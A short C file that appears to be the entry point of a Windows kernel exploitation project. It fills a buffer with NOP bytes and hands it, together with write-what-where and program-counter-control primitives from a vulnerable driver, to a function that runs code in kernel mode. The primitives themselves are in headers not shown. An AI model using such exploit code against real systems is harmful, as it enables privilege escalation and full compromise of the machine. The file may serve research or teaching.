#pragma once
#include "Vulnerabilities.h"
#include "Exploitation Methods.h"
#include <stdio.h>

#define PIC_SIZE 0x500

int main() {

	PBYTE pic = (PBYTE)malloc(0x500);
	
	memset(pic, 0x90, PIC_SIZE); //initialize with nops
	vtableSelfReferenceKernelModePicExecutor(VulnerableDriverControlProgramCounter, VulnerableDriverWriteWhatWhere, (PBYTE)pic, PIC_SIZE);

	return 0;
}
